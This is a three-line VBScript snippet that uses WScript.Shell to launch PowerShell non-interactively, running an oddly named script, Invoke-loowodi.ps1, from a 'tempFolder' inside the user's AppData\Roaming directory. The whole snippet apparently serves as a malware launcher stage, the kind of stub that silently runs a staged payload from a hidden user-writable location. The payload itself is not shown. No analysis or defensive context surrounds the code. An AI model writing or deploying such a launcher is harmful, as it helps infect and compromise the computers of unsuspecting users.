command = "powershell.exe -nologo -noninteractive -command ""& $env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"""
set shell = CreateObject("WScript.Shell")
shell.Run command,1,false
